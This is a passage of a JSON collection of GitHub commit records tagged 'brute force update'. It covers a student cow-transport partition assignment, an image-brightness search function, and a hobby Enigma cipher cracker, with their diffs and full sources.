of cows may or may not be optimal.\r\n    The greedy heuristic should follow the following method:\r\n\r\n    1. As long as the current trip can fit another cow, add the largest cow that will fit\r\n        to the trip\r\n    2. Once the trip is full, begin a new trip to transport the remaining cows\r\n\r\n    Does not mutate the given dictionary of cows.\r\n\r\n    Parameters:\r\n    cows - a dictionary of name (string), weight (int) pairs\r\n    limit - weight limit of the spaceship (an int)\r\n    \r\n    Returns:\r\n    A list of lists, with each inner list containing the names of cows\r\n    transported on a particular trip and the overall list containing all the\r\n    trips\r\n    \"\"\"\r\n    working_dict = cows.copy()\r\n    trips = []\r\n    while len(working_dict) > 0:\r\n        trip_result = greedy_build_trip(working_dict, limit)\r\n        trips.append(trip_result[0])\r\n        working_dict = trip_result[1]\r\n    return trips\r\n\r\ndef greedy_build_trip(cows, limit):\r\n    \"\"\"\r\n    Builds a single trip of cows that abides with the weight limit. Takes the heaviest\r\n    cow and loads that cow first. Then fills the trip with the next heaviest cow that still\r\n    fits.\r\n\r\n    Parameters:\r\n    cows - a dictionary of name (string), weight (int) pairs\r\n    limit - weight limit of the spaceship (int)\r\n\r\n    Returns:\r\n    A tuple with the following items:\r\n    A list of strings, with each string representing a cow name on the current trip\r\n    A dictionary with the remaining cows not yet boarded\r\n    \"\"\"\r\n    trip = []\r\n    unloaded_cows = cows.copy()\r\n    remaining_cows = cows.copy()\r\n    trip_weight = 0\r\n    while len(remaining_cows) > 0:\r\n        heaviest_cow = max(remaining_cows, key=remaining_cows.get)\r\n        if remaining_cows[heaviest_cow] <= 10 - trip_weight:\r\n            trip.append(heaviest_cow)\r\n            trip_weight += remaining_cows[heaviest_cow]\r\n            del remaining_cows[heaviest_cow]\r\n            del unloaded_cows[heaviest_cow]\r\n        else:\r\n            del remaining_cows[heaviest_cow]\r\n    return (trip,unloaded_cows)\r\n\r\n# Problem 3\r\ndef brute_force_cow_transport(cows,limit=10):\r\n    \"\"\"\r\n    Finds the allocation of cows that minimizes the number of spaceship trips\r\n    via brute force.  The brute force algorithm should follow the following method:\r\n\r\n    1. Enumerate all possible ways that the cows can be divided into separate trips \r\n        Use the given get_partitions function in ps1_partition.py to help you!\r\n    2. Select the allocation that minimizes the number of trips without making any trip\r\n        that does not obey the weight limitation\r\n            \r\n    Does not mutate the given dictionary of cows.\r\n\r\n    Parameters:\r\n    cows - a dictionary of name (string), weight (int) pairs\r\n    limit - weight limit of the spaceship (an int)\r\n    \r\n    Returns:\r\n    A list of lists, with each inner list containing the names of cows\r\n    transported on a particular trip and the overall list containing all the\r\n    trips\r\n    \"\"\"\r\n    set = []\r\n    valid_partitions = []\r\n    for n in range(len(cows)):\r\n        set.append(n)\r\n    for partition in get_partitions(set):\r\n        if check_part(partition, cows, limit):\r\n            valid_partitions.append(partition)\r\n    return min(valid_partitions, key=valid_partitions.get)\r\n\r\ndef check_part(part, dict, limit):\r\n    \"\"\"\r\n    Evaluates a partition to verify that each list within the partition abides with the\r\n    weight limit for the container.\r\n\r\n    Parameters:\r\n    part - a list of lists of integers that enumerate the possible partitions for the dict\r\n    dict - a dictionary with keys cow name (string) and values weight (integer)\r\n    limit - spaceship weight capcity (integer)\r\n\r\n    Returns: \r\n    Boolean - True if all sublists of part have summed dict values <= limit\r\n            - Otherwise False\r\n    \"\"\"\r\n    values_list = list(dict.values())\r\n    for trip in part:\r\n        trip_weight = 0\r\n        for cow in trip:\r\n            trip_weight += values_list[cow]\r\n        if trip_weight > limit:\r\n            return False\r\n    return True\r\n        \r\n# Problem 4\r\ndef compare_cow_transport_algorithms():\r\n    \"\"\"\r\n    Using the data from ps1_cow_data.txt and the specified weight limit, run your\r\n    greedy_cow_transport and brute_force_cow_transport functions here. Use the\r\n    default weight limits of 10 for both greedy_cow_transport and\r\n    brute_force_cow_transport.\r\n    \r\n    Print out the number of trips returned by each method, and how long each\r\n    method takes to run in seconds.\r\n\r\n    Returns:\r\n    Does not return anything.\r\n    \"\"\"\r\n    # TODO: Your code here\r\n    pass\r\n\r\n\r\nif __name__ == '__main__':\r\n    print('The result of greedy load 1: ' + str(greedy_cow_transport(load_cows('ps1_cow_data.txt'))))\r\n    print('The result of greedy load 2: ' + str(greedy_cow_transport(load_cows('ps1_cow_data_2.txt'))))\r\n    print('The result of brute force load 1: ' +str(brute_force_cow_transport(load_cows('ps1_cow_data.txt'))))\r\n    print('The result of brute force load 1: ' +str(brute_force_cow_transport(load_cows('ps1_cow_data_2.txt'))))"}},"msg":"Updated brute_force_cow_transport."}},"https:\/\/github.com\/ismailsiddiqui011\/Document_Clean":{"ddf290c0f8b35e4b861594f56e00d5fc0b3dd200":{"url":"https:\/\/api.github.com\/repos\/ismailsiddiqui011\/Document_Clean\/commits\/ddf290c0f8b35e4b861594f56e00d5fc0b3dd200","html_url":"https:\/\/github.com\/ismailsiddiqui011\/Document_Clean\/commit\/ddf290c0f8b35e4b861594f56e00d5fc0b3dd200","sha":"ddf290c0f8b35e4b861594f56e00d5fc0b3dd200","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 30b67de..f0123ab 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -13,7 +13,7 @@ def brute_force(img, epoch = 20):\n     for i in range(1, epoch+1):\n         factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n         pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n-        pred = PIL.ImageOps.autocontrast(pred)autocontrast(pred)\n+        pred = PIL.ImageOps.autocontrast(pred)\n         score = brightness_(img_to_array(pred)\/255)\n         if score <= 0.95:\n             res[score] = factor, pred\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n     for i in range(1, epoch+1):\n         factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n         pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n-        pred = PIL.ImageOps.autocontrast(pred)autocontrast(pred)\n+        pred = PIL.ImageOps.autocontrast(pred)\n         score = brightness_(img_to_array(pred)\/255)\n         if score <= 0.95:\n             res[score] = factor, pred\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["        pred = PIL.ImageOps.autocontrast(pred)autocontrast(pred)"],"goodparts":["        pred = PIL.ImageOps.autocontrast(pred)"]}],"source":"\nimport PIL from tensorflow.keras.preprocessing.image import img_to_array from numpy.linalg import norm import numpy as np def brightness_(img): if len(img.shape)==3: return np.average(norm(img, axis=2)) \/ np.sqrt(3) else: return np.average(img) def brute_force(img, epoch=20): res={} for i in range(1, epoch+1): factor=((1 -brightness_(img_to_array(img)\/255))*i)+0.1 pred=PIL.ImageEnhance.Brightness(img).enhance(factor) pred=PIL.ImageOps.autocontrast(pred)autocontrast(pred) score=brightness_(img_to_array(pred)\/255) if score <=0.95: res[score]=factor, pred res=dict(sorted(res.items(), reverse=True)) score, temp=list(res.items())[0] factor, pred=temp return pred, score, factor ","sourceWithComments":"import PIL\nfrom tensorflow.keras.preprocessing.image import img_to_array \nfrom numpy.linalg import norm\nimport numpy as np\ndef brightness_(img): # Function to estimate the brightness ofcourse it may not be accurate but it will give a good estimation\n    if len(img.shape) == 3:\n        return np.average(norm(img, axis=2)) \/ np.sqrt(3)\n    else:\n        return np.average(img)\n\ndef brute_force(img, epoch = 20):\n    res = {}\n    for i in range(1, epoch+1):\n        factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n        pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n        pred = PIL.ImageOps.autocontrast(pred)autocontrast(pred)\n        score = brightness_(img_to_array(pred)\/255)\n        if score <= 0.95:\n            res[score] = factor, pred\n\n    res = dict(sorted(res.items(), reverse = True))\n    score, temp = list(res.items())[0]\n    factor, pred = temp\n    return pred, score, factor\n"}},"msg":"Update brute_force.py"},"e77ab0a076372f354beb8a83de216ef7d3f807bd":{"url":"https:\/\/api.github.com\/repos\/ismailsiddiqui011\/Document_Clean\/commits\/e77ab0a076372f354beb8a83de216ef7d3f807bd","html_url":"https:\/\/github.com\/ismailsiddiqui011\/Document_Clean\/commit\/e77ab0a076372f354beb8a83de216ef7d3f807bd","message":"Update brute_force.py","sha":"e77ab0a076372f354beb8a83de216ef7d3f807bd","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex f0123ab..728e35e 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -2,6 +2,8 @@\n from tensorflow.keras.preprocessing.image import img_to_array \n from numpy.linalg import norm\n import numpy as np\n+from stqdm import stqdm\n+\n def brightness_(img): # Function to estimate the brightness ofcourse it may not be accurate but it will give a good estimation\n     if len(img.shape) == 3:\n         return np.average(norm(img, axis=2)) \/ np.sqrt(3)\n@@ -10,7 +12,7 @@ def brightness_(img): # Function to estimate the brightness ofcourse it may not\n \n def brute_force(img, epoch = 20):\n     res = {}\n-    for i in range(1, epoch+1):\n+    for i in stqdm(range(1, epoch+1)):\n         factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n         pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n         pred = PIL.ImageOps.autocontrast(pred)\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n def brute_force(img, epoch = 20):\n     res = {}\n-    for i in range(1, epoch+1):\n+    for i in stqdm(range(1, epoch+1)):\n         factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n         pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n         pred = PIL.ImageOps.autocontrast(pred)\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["    for i in range(1, epoch+1):"],"goodparts":["    for i in stqdm(range(1, epoch+1)):"]}],"source":"\nimport PIL from tensorflow.keras.preprocessing.image import img_to_array from numpy.linalg import norm import numpy as np def brightness_(img): if len(img.shape)==3: return np.average(norm(img, axis=2)) \/ np.sqrt(3) else: return np.average(img) def brute_force(img, epoch=20): res={} for i in range(1, epoch+1): factor=((1 -brightness_(img_to_array(img)\/255))*i)+0.1 pred=PIL.ImageEnhance.Brightness(img).enhance(factor) pred=PIL.ImageOps.autocontrast(pred) score=brightness_(img_to_array(pred)\/255) if score <=0.95: res[score]=factor, pred res=dict(sorted(res.items(), reverse=True)) score, temp=list(res.items())[0] factor, pred=temp return pred, score, factor ","sourceWithComments":"import PIL\nfrom tensorflow.keras.preprocessing.image import img_to_array \nfrom numpy.linalg import norm\nimport numpy as np\ndef brightness_(img): # Function to estimate the brightness ofcourse it may not be accurate but it will give a good estimation\n    if len(img.shape) == 3:\n        return np.average(norm(img, axis=2)) \/ np.sqrt(3)\n    else:\n        return np.average(img)\n\ndef brute_force(img, epoch = 20):\n    res = {}\n    for i in range(1, epoch+1):\n        factor = ((1 - brightness_(img_to_array(img)\/255))*i)+0.1\n        pred = PIL.ImageEnhance.Brightness(img).enhance(factor)\n        pred = PIL.ImageOps.autocontrast(pred)\n        score = brightness_(img_to_array(pred)\/255)\n        if score <= 0.95:\n            res[score] = factor, pred\n\n    res = dict(sorted(res.items(), reverse = True))\n    score, temp = list(res.items())[0]\n    factor, pred = temp\n    return pred, score, factor\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/AndrewPikeGIS\/enigma_code_breaker":{"f30e778acefb2ec2dc194b5c84ca30efa3470afc":{"url":"https:\/\/api.github.com\/repos\/AndrewPikeGIS\/enigma_code_breaker\/commits\/f30e778acefb2ec2dc194b5c84ca30efa3470afc","html_url":"https:\/\/github.com\/AndrewPikeGIS\/enigma_code_breaker\/commit\/f30e778acefb2ec2dc194b5c84ca30efa3470afc","message":"updated method names for brute force algorithm","sha":"f30e778acefb2ec2dc194b5c84ca30efa3470afc","keyword":"brute force update","diff":"diff --git a\/crack_enigma.py b\/crack_enigma.py\nindex 0bff166..f0b7602 100644\n--- a\/crack_enigma.py\n+++ b\/crack_enigma.py\n@@ -110,7 +110,7 @@ def check_output_on_known_val(self):\n             print(\n                 \"Known values missing. Please add known value with set_known_value() first.\")\n \n-    def interate_on_starting_positions(self):\n+    def brute_force_interate_on_starting_positions(self):\n         # iterate the enigma starting positions\n \n         return_val = \"\"\n@@ -133,12 +133,12 @@ def interate_on_starting_positions(self):\n \n         return(return_val)\n \n-    def iterate_on_rotor_seed(self):\n+    def brute_force_iterate_on_rotor_seed(self):\n         # iterate the enigma seeds\n         print(\"All rotor seeds checked\")\n         return(\"Done\")\n \n-    def iterate_on_plugboard(self):\n+    def brute_force_iterate_on_plugboard(self):\n         # iterate on plugboard\n         if self.plugboard_seed != 10:\n             self.plugboard_seed += 1\n@@ -148,7 +148,7 @@ def iterate_on_plugboard(self):\n             print(\"All plugboard combinations checked\")\n             return(\"Done\")\n \n-    def iterate_on_reflector(self):\n+    def brute_force_iterate_on_reflector(self):\n         # iterate on reflector\n         if self.reflector_seed != 10:\n             self.reflector_seed += 1\n@@ -227,22 +227,22 @@ def check_enigma_settings(self):\n             self.store_decrypt_score(total_iterations)\n \n             # iterate on start position\n-            iterate_start_return = self.interate_on_starting_positions()\n+            iterate_start_return = self.brute_force_interate_on_starting_positions()\n \n             if iterate_start_return == \"Done\":\n \n-                iterate_plug_return = self.iterate_on_plugboard()\n+                iterate_plug_return = self.brute_force_iterate_on_plugboard()\n \n                 int_counter = 0\n                 current_status = 0\n \n                 if iterate_plug_return == \"Done\":\n                     # iterate on reflector\n-                    iterate_reflector_return = self.iterate_on_reflector()\n+                    iterate_reflector_return = self.brute_force_iterate_on_reflector()\n \n                     if iterate_reflector_return == \"Done\":\n                         # iterate on rotor seed\n-                        iterate_seed_return = self.iterate_on_rotor_seed()\n+                        iterate_seed_return = self.brute_force_iterate_on_rotor_seed()\n \n                         if iterate_seed_return == \"Done\":\n                             # all combinations checked.\n","files":{"\/crack_enigma.py":{"changes":[{"diff":"\n             print(\n                 \"Known values missing. Please add known value with set_known_value() first.\")\n \n-    def interate_on_starting_positions(self):\n+    def brute_force_interate_on_starting_positions(self):\n         # iterate the enigma starting positions\n \n         return_val = \"\"\n","add":1,"remove":1,"filename":"\/crack_enigma.py","badparts":["    def interate_on_starting_positions(self):"],"goodparts":["    def brute_force_interate_on_starting_positions(self):"]},{"diff":"\n \n         return(return_val)\n \n-    def iterate_on_rotor_seed(self):\n+    def brute_force_iterate_on_rotor_seed(self):\n         # iterate the enigma seeds\n         print(\"All rotor seeds checked\")\n         return(\"Done\")\n \n-    def iterate_on_plugboard(self):\n+    def brute_force_iterate_on_plugboard(self):\n         # iterate on plugboard\n         if self.plugboard_seed != 10:\n             self.plugboard_seed += 1\n","add":2,"remove":2,"filename":"\/crack_enigma.py","badparts":["    def iterate_on_rotor_seed(self):","    def iterate_on_plugboard(self):"],"goodparts":["    def brute_force_iterate_on_rotor_seed(self):","    def brute_force_iterate_on_plugboard(self):"]},{"diff":"\n             print(\"All plugboard combinations checked\")\n             return(\"Done\")\n \n-    def iterate_on_reflector(self):\n+    def brute_force_iterate_on_reflector(self):\n         # iterate on reflector\n         if self.reflector_seed != 10:\n             self.reflector_seed += 1\n","add":1,"remove":1,"filename":"\/crack_enigma.py","badparts":["    def iterate_on_reflector(self):"],"goodparts":["    def brute_force_iterate_on_reflector(self):"]},{"diff":"\n             self.store_decrypt_score(total_iterations)\n \n             # iterate on start position\n-            iterate_start_return = self.interate_on_starting_positions()\n+            iterate_start_return = self.brute_force_interate_on_starting_positions()\n \n             if iterate_start_return == \"Done\":\n \n-                iterate_plug_return = self.iterate_on_plugboard()\n+                iterate_plug_return = self.brute_force_iterate_on_plugboard()\n \n                 int_counter = 0\n                 current_status = 0\n \n                 if iterate_plug_return == \"Done\":\n                     # iterate on reflector\n-                    iterate_reflector_return = self.iterate_on_reflector()\n+                    iterate_reflector_return = self.brute_force_iterate_on_reflector()\n \n                     if iterate_reflector_return == \"Done\":\n                         # iterate on rotor seed\n-                        iterate_seed_return = self.iterate_on_rotor_seed()\n+                        iterate_seed_return = self.brute_force_iterate_on_rotor_seed()\n \n                         if iterate_seed_return == \"Done\":\n                             # all combinations checked.\n","add":4,"remove":4,"filename":"\/crack_enigma.py","badparts":["            iterate_start_return = self.interate_on_starting_positions()","                iterate_plug_return = self.iterate_on_plugboard()","                    iterate_reflector_return = self.iterate_on_reflector()","                        iterate_seed_return = self.iterate_on_rotor_seed()"],"goodparts":["            iterate_start_return = self.brute_force_interate_on_starting_positions()","                iterate_plug_return = self.brute_force_iterate_on_plugboard()","                    iterate_reflector_return = self.brute_force_iterate_on_reflector()","                        iterate_seed_return = self.brute_force_iterate_on_rotor_seed()"]}],"source":"\n\nfrom string import ascii_lowercase import pandas as pd from enigma_code.enigma_cypher_machine import EnigmaMachine import datetime as dt class Victory(EnigmaMachine): def __init__(self): self.encrypted_string=\"\" self.decrypted_string=\"\" self.known_value=\"\" self.matched_values=\"\" self.rotor1_seed=1 self.rotor2_seed=2 self.rotor3_seed=3 self.rotor1_start=0 self.rotor2_start=0 self.rotor3_start=0 self.reflector_seed=0 self.plugboard_seed=0 self.rotor_status=0 self.plugboard_status=0 self.reflector_status=0 self.rotor_seed_status=0 self.decrypt_score=0 self.score_table=pd.read_csv(r\"data\/decrypt_score.csv\") self.build_reflector() self.build_plug_board() self.build_rotors() def read_encrypted_text(self, txt_path): with open(txt_path, \"r\") as txt_file: self.encrypted_string=txt_file.read() self.known_value=\" \" * len(self.encrypted_string) def set_known_value(self, value, start_position): known_val=self.known_value length_replacement=len(value) known_val=known_val[:start_position] +value +\\ known_val[start_position +length_replacement:] self.known_value=known_val def check_output_on_known_val(self): known_string=self.known_value known_string=known_string.lower() length_known_inputs=len( known_string.replace(\" \", \"\").replace(\"\\n\", \"\").replace(\".\", \"\").replace(\",\", \"\").replace(\"!\", \"\")) self.matched_values=\"\" if self.decrypted_string !=\"\" and known_string !=\"\": decrypted_string=self.decrypted_string counter=0 for x in range(len(known_string)): if decrypted_string[x] in ascii_lowercase: if known_string[x]==decrypted_string[x]: counter +=1 self.matched_values +=known_string[x] else: self.matched_values +=\" \" else: self.matched_values +=decrypted_string[x] self.decrypt_score=( counter\/length_known_inputs) * 100.0 elif self.known_value !=\"\": print(\"Missing decrypted value. Please run decrypt_string() first.\") elif self.known_value==\"\": print( \"Known values missing. Please add known value with set_known_value() first.\") def interate_on_starting_positions(self): return_val=\"\" self.rotor1_start +=1 if self.rotor1_start >=26: self.rotor1_start=0 self.rotor2_start +=1 if self.rotor2_start >=26: self.rotor2_start=0 self.rotor3_start +=1 if self.rotor3_start >=26: self.rotor1_start=0 self.rotor2_start=0 self.rotor3_start=0 return_val=\"Done\" print(\"All rotor start positons checked\") self.rotor_1.position=self.rotor1_start self.rotor_2.position=self.rotor2_start self.rotor_3.position=self.rotor3_start return(return_val) def iterate_on_rotor_seed(self): print(\"All rotor seeds checked\") return(\"Done\") def iterate_on_plugboard(self): if self.plugboard_seed !=10: self.plugboard_seed +=1 self.build_plug_board() else: self.plugboard_seed=0 print(\"All plugboard combinations checked\") return(\"Done\") def iterate_on_reflector(self): if self.reflector_seed !=10: self.reflector_seed +=1 self.build_reflector() else: self.reflector_seed=0 print(\"All reflector combinations checked\") return(\"Done\") def store_decrypt_score(self, run_number): if self.decrypt_score >=0: new_score=pd.DataFrame(data={\"run\":[run_number], \"rotor1_seed\":[self.rotor_1.rotor_seed], \"rotor2_seed\":[self.rotor_2.rotor_seed], \"rotor3_seed\":[self.rotor_3.rotor_seed], \"rotor1_start\":[self.rotor1_start], \"rotor2_start\":[self.rotor2_start], \"rotor3_start\":[self.rotor3_start], \"reflector\":[self.reflector], \"plugboard\":[self.plug_board], \"score\":[self.decrypt_score], \"known_value\":[self.known_value], \"decrypted_message\":[self.decrypted_string], \"matched_values\":[self.matched_values], \"encrypted_message\":[self.encrypted_string], \"reflector_seed\":[self.reflector_seed], \"plugboard_seed\":[self.plugboard_seed]}) concat_df=pd.concat( [self.score_table, new_score], ignore_index=True) self.score_table=concat_df def write_score_table(self): self.score_table.to_excel( \"output\/decrypt_score_\" +str(dt.date.today()) +\".xlsx\") def hours_minutes_seconds(self, timedelta): days=timedelta.days seconds=timedelta.seconds hours=seconds\/\/3600 minutes=(seconds\/\/60) % 60 print(\"Time elapsed days:\", days, \"hours:\", hours, \"minutes:\", minutes, \"\\n\") def print_percentage(self, run_count, number_of_iterations, current_status): percentage=(run_count\/number_of_iterations)*100 if percentage >=25.0 and current_status==0: print(\"25% complete\") current_status +=25 elif percentage >=50.0 and current_status==25: print(\"50% complete\") current_status +=25 elif percentage >=75.0 and current_status==50: print(\"75% complete\") current_status +=25 elif percentage >=99.0 and current_status==75: print(\"99% complete\") current_status +=25 return(current_status) def check_enigma_settings(self): time_start=dt.datetime.now() iterate_plug_return=\"\" iterate_reflector_return=\"\" iterate_seed_return=\"\" int_counter=0 total_iterations=0 current_status=0 number_of_iterations=26**3 print(\"Checking rotor starting positions for plugboard seed:\" + str(self.plugboard_seed) +\" and reflector: \" +str(self.reflector_seed)) while self.decrypt_score < 100.0: total_iterations +=1 int_counter +=1 self.decrypt_string() self.check_output_on_known_val() self.store_decrypt_score(total_iterations) iterate_start_return=self.interate_on_starting_positions() if iterate_start_return==\"Done\": iterate_plug_return=self.iterate_on_plugboard() int_counter=0 current_status=0 if iterate_plug_return==\"Done\": iterate_reflector_return=self.iterate_on_reflector() if iterate_reflector_return==\"Done\": iterate_seed_return=self.iterate_on_rotor_seed() if iterate_seed_return==\"Done\": print(\"All combinations checked\\n\") break print(\"Checked rotor starting positions for plugboard seed:\" + str(self.plugboard_seed) +\" and reflector: \" +str(self.reflector_seed)) current_status=self.print_percentage( int_counter, number_of_iterations, current_status) self.write_score_table() score=self.score_table[\"score\"] print(\"Max score found==\" +str(score.max())) print(\"\") delta_time=dt.datetime.now()-time_start self.hours_minutes_seconds(delta_time) print(\"Time per iteration:\") print(delta_time\/total_iterations) VictoryTest=Victory() VictoryTest.read_encrypted_text(r\"encrypted_commands\/command1.txt\") VictoryTest.set_known_value(\"Good Morning,\\n\\nWeather today\", 0) VictoryTest.set_known_value( \"Hail Hitler.\", len(VictoryTest.encrypted_string)-12) VictoryTest.check_enigma_settings() ","sourceWithComments":"\nfrom string import ascii_lowercase\nimport pandas as pd\nfrom enigma_code.enigma_cypher_machine import EnigmaMachine\nimport datetime as dt\n\n\nclass Victory(EnigmaMachine):\n    def __init__(self):\n        self.encrypted_string = \"\"\n\n        self.decrypted_string = \"\"\n\n        self.known_value = \"\"\n\n        self.matched_values = \"\"\n\n        self.rotor1_seed = 1\n\n        self.rotor2_seed = 2\n\n        self.rotor3_seed = 3\n\n        self.rotor1_start = 0\n\n        self.rotor2_start = 0\n\n        self.rotor3_start = 0\n\n        self.reflector_seed = 0\n\n        # self.plug_board = {\n        #     \"a\": \"b\",\n        #     \"c\": \"d\",\n        #     \"e\": \"f\",\n        #     \"g\": \"h\",\n        #     \"i\": \"j\",\n        #     \"k\": \"l\",\n        #     \"m\": \"n\",\n        #     \"o\": \"p\",\n        #     \"q\": \"r\",\n        #     \"s\": \"t\"}\n\n        self.plugboard_seed = 0\n\n        self.rotor_status = 0\n\n        self.plugboard_status = 0\n\n        self.reflector_status = 0\n\n        self.rotor_seed_status = 0\n\n        self.decrypt_score = 0\n\n        self.score_table = pd.read_csv(r\"data\/decrypt_score.csv\")\n\n        self.build_reflector()\n\n        self.build_plug_board()\n\n        self.build_rotors()\n\n    def read_encrypted_text(self, txt_path):\n        with open(txt_path, \"r\") as txt_file:\n            self.encrypted_string = txt_file.read()\n\n        self.known_value = \" \" * len(self.encrypted_string)\n\n    def set_known_value(self, value, start_position):\n\n        known_val = self.known_value\n\n        length_replacement = len(value)\n\n        known_val = known_val[:start_position] + value + \\\n            known_val[start_position + length_replacement:]\n\n        self.known_value = known_val\n\n    def check_output_on_known_val(self):\n        # check the decrypted string against the known value string and give a score\n        known_string = self.known_value\n        known_string = known_string.lower()\n\n        length_known_inputs = len(\n            known_string.replace(\" \", \"\").replace(\"\\n\", \"\").replace(\".\", \"\").replace(\",\", \"\").replace(\"!\", \"\"))\n        self.matched_values = \"\"\n        if self.decrypted_string != \"\" and known_string != \"\":\n\n            decrypted_string = self.decrypted_string\n\n            counter = 0\n\n            for x in range(len(known_string)):\n                if decrypted_string[x] in ascii_lowercase:\n                    if known_string[x] == decrypted_string[x]:\n                        counter += 1\n                        self.matched_values += known_string[x]\n                    else:\n                        self.matched_values += \" \"\n                else:\n                    self.matched_values += decrypted_string[x]\n\n            self.decrypt_score = (\n                counter\/length_known_inputs) * 100.0\n        elif self.known_value != \"\":\n            print(\"Missing decrypted value. Please run decrypt_string() first.\")\n        elif self.known_value == \"\":\n            print(\n                \"Known values missing. Please add known value with set_known_value() first.\")\n\n    def interate_on_starting_positions(self):\n        # iterate the enigma starting positions\n\n        return_val = \"\"\n        self.rotor1_start += 1\n        if self.rotor1_start >= 26:\n            self.rotor1_start = 0\n            self.rotor2_start += 1\n            if self.rotor2_start >= 26:\n                self.rotor2_start = 0\n                self.rotor3_start += 1\n                if self.rotor3_start >= 26:\n                    self.rotor1_start = 0\n                    self.rotor2_start = 0\n                    self.rotor3_start = 0\n                    return_val = \"Done\"\n                    print(\"All rotor start positons checked\")\n        self.rotor_1.position = self.rotor1_start\n        self.rotor_2.position = self.rotor2_start\n        self.rotor_3.position = self.rotor3_start\n\n        return(return_val)\n\n    def iterate_on_rotor_seed(self):\n        # iterate the enigma seeds\n        print(\"All rotor seeds checked\")\n        return(\"Done\")\n\n    def iterate_on_plugboard(self):\n        # iterate on plugboard\n        if self.plugboard_seed != 10:\n            self.plugboard_seed += 1\n            self.build_plug_board()\n        else:\n            self.plugboard_seed = 0\n            print(\"All plugboard combinations checked\")\n            return(\"Done\")\n\n    def iterate_on_reflector(self):\n        # iterate on reflector\n        if self.reflector_seed != 10:\n            self.reflector_seed += 1\n            self.build_reflector()\n        else:\n            self.reflector_seed = 0\n            print(\"All reflector combinations checked\")\n            return(\"Done\")\n\n    def store_decrypt_score(self, run_number):\n        if self.decrypt_score >= 0:\n            new_score = pd.DataFrame(data={\"run\": [run_number], \"rotor1_seed\": [self.rotor_1.rotor_seed], \"rotor2_seed\": [self.rotor_2.rotor_seed], \"rotor3_seed\": [self.rotor_3.rotor_seed],\n                                           \"rotor1_start\": [self.rotor1_start], \"rotor2_start\": [self.rotor2_start], \"rotor3_start\": [self.rotor3_start],\n                                           \"reflector\": [self.reflector], \"plugboard\": [self.plug_board], \"score\": [self.decrypt_score], \"known_value\": [self.known_value],\n                                           \"decrypted_message\": [self.decrypted_string], \"matched_values\": [self.matched_values], \"encrypted_message\": [self.encrypted_string],\n                                           \"reflector_seed\": [self.reflector_seed], \"plugboard_seed\": [self.plugboard_seed]})\n\n            concat_df = pd.concat(\n                [self.score_table, new_score], ignore_index=True)\n\n            self.score_table = concat_df\n\n    def write_score_table(self):\n        # update to only include scores above 50%?\n        self.score_table.to_excel(\n            \"output\/decrypt_score_\" + str(dt.date.today()) + \".xlsx\")\n\n    def hours_minutes_seconds(self, timedelta):\n        days = timedelta.days\n        seconds = timedelta.seconds\n        hours = seconds\/\/3600\n        minutes = (seconds\/\/60) % 60\n        print(\"Time elapsed days:\", days, \"hours:\",\n              hours, \"minutes:\", minutes, \"\\n\")\n\n    def print_percentage(self, run_count, number_of_iterations, current_status):\n        percentage = (run_count\/number_of_iterations)*100\n\n        if percentage >= 25.0 and current_status == 0:\n            print(\"25% complete\")\n            current_status += 25\n        elif percentage >= 50.0 and current_status == 25:\n            print(\"50% complete\")\n            current_status += 25\n        elif percentage >= 75.0 and current_status == 50:\n            print(\"75% complete\")\n            current_status += 25\n        elif percentage >= 99.0 and current_status == 75:\n            print(\"99% complete\")\n            current_status += 25\n\n        return(current_status)\n\n    # brute force algorithm for breaking the code\n    def check_enigma_settings(self):\n        time_start = dt.datetime.now()\n        iterate_plug_return = \"\"\n        iterate_reflector_return = \"\"\n        iterate_seed_return = \"\"\n        int_counter = 0\n        total_iterations = 0\n        current_status = 0\n        number_of_iterations = 26**3\n        # check rotor positions for initial plugboard, reflector and seed options.\n        print(\"Checking rotor starting positions for plugboard seed:\" +\n              str(self.plugboard_seed) + \" and reflector: \" + str(self.reflector_seed))\n        while self.decrypt_score < 100.0:\n            total_iterations += 1\n            int_counter += 1\n            self.decrypt_string()\n\n            # check decrypted text with known val\n            self.check_output_on_known_val()\n\n            # store the decrypted values in the score dataframe\n            self.store_decrypt_score(total_iterations)\n\n            # iterate on start position\n            iterate_start_return = self.interate_on_starting_positions()\n\n            if iterate_start_return == \"Done\":\n\n                iterate_plug_return = self.iterate_on_plugboard()\n\n                int_counter = 0\n                current_status = 0\n\n                if iterate_plug_return == \"Done\":\n                    # iterate on reflector\n                    iterate_reflector_return = self.iterate_on_reflector()\n\n                    if iterate_reflector_return == \"Done\":\n                        # iterate on rotor seed\n                        iterate_seed_return = self.iterate_on_rotor_seed()\n\n                        if iterate_seed_return == \"Done\":\n                            # all combinations checked.\n                            print(\"All combinations checked\\n\")\n                            break\n\n                print(\"Checked rotor starting positions for plugboard seed:\" +\n                      str(self.plugboard_seed) + \" and reflector: \" + str(self.reflector_seed))\n\n            current_status = self.print_percentage(\n                int_counter, number_of_iterations, current_status)\n\n        # store score in table\n        self.write_score_table()\n\n        score = self.score_table[\"score\"]\n        print(\"Max score found == \" + str(score.max()))\n        print(\"\")\n\n        delta_time = dt.datetime.now()-time_start\n        self.hours_minutes_seconds(delta_time)\n        print(\"Time per iteration:\")\n        print(delta_time\/total_iterations)\n\n\nVictoryTest = Victory()\n\nVictoryTest.read_encrypted_text(r\"encrypted_commands\/command1.txt\")\n\nVictoryTest.set_known_value(\"Good Morning,\\n\\nWeather today\", 0)\n\nVictoryTest.set_known_value(\n    \"Hail Hitler.\", len(VictoryTest.encrypted_string)-12)\n\n\nVictoryTest.check_enigma_settings()\n"}},"msg":"updated method names for brute force 